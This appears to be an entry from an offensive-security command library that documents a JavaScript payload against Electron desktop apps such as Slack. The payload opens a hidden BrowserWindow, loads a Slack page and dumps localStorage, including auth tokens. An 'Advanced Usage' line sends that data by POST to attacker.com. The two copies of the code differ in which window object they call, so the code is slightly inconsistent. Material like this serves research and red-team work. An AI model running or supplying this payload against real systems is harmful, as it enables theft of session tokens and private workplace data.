---
id: cmd-electron-data-exfil
data: |-
  window.desktop.delegate = {}
  window.desktop.delegate.canOpenURLInWindow = () => true
  window.desktop.window = {}
  window.desktop.window.open = () => 1
  bw = window.open('about:blank')
  nbw = new bw.constructor({show: false})
  nbw.loadURL('https://app.slack.com/robots.txt')
  nbw.webContents.executeJavaScript('alert(JSON.stringify(localStorage))')
tags:
  - exfiltration
  - data-theft
type: command
output: null
executor: javascript
platforms:
  - Desktop (Electron)
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:15.133Z'
verified: false
validated: true
submitted: true
---
# electron-data-exfil

## Command

```javascript
window.desktop.delegate = {}
window.desktop.delegate.canOpenURLInWindow = () => true
window.desktop.window = {}
window.desktop.window.open = () => 1
bw = window.open('about:blank')
nbw = new bw.constructor({show: false})
bw.loadURL('https://app.slack.com/robots.txt')
bw.webContents.executeJavaScript('alert(JSON.stringify(localStorage))')
```

## Description

This JS command creates a tunneled BrowserWindow to load a Slack URL and dump localStorage, exfiltrating tokens and private data without full RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| loadURL | URL to load for context, e.g., 'https://app.slack.com/robots.txt' for quick access | Yes |
| show | false for hidden operation | Yes |

## Examples

### Basic Usage

```javascript
// Dumps localStorage via alert
```

### Advanced Usage

Replace alert with fetch to attacker server for exfil.

```javascript
nbw.webContents.executeJavaScript('fetch("https://attacker.com/dump", {method: "POST", body: JSON.stringify(localStorage)})');
```

## Expected Output

Alert popup with JSON string of localStorage, including Slack auth tokens.

## Related

- [[commands/electron-browserwindow-rce-mac]]
- [[procedures/Trigger-Redirect-and-RCE-in-Desktop-App]]
